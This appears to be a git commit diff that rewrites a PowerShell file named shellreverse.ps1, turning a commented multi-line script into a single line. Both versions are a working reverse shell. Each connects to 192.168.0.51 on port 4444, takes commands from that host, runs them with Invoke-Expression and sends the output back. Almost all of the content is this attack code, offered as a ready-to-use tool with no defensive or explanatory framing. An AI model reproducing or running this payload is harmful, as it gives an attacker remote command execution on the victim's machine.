b035662a339a59bc2a6f54a1fe033aa823313e3a
Elie Ferreira Rodrigues Paes <133657740+Elie-Ferreir4@users.noreply.github.com>
2023-12-03 14:12:49 -0300

    Update shellreverse.ps1

--- shellreverse.ps1
+++ shellreverse.ps1
@@ -1,16 +1,1 @@
-$sm=(New-Object Net.Sockets.TCPClient("192.168.0.51",4444)).GetStream();
-[byte[]]$bt=0..65535|%{0};
-
-while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){
-    $d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
-
-    # Verifica se o comando inicia com "$cmd:"
-    if ($d.StartsWith("$cmd:")) {
-        $cmdOutput = Invoke-Expression -Command $d.Substring(5) 2>&1;
-        $st=([text.encoding]::ASCII).GetBytes($cmdOutput);
-    } else {
-        $st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));
-    }
-
-    $sm.Write($st,0,$st.Length);
-}
+$sm=(New-Object Net.Sockets.TCPClient("192.168.0.51",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
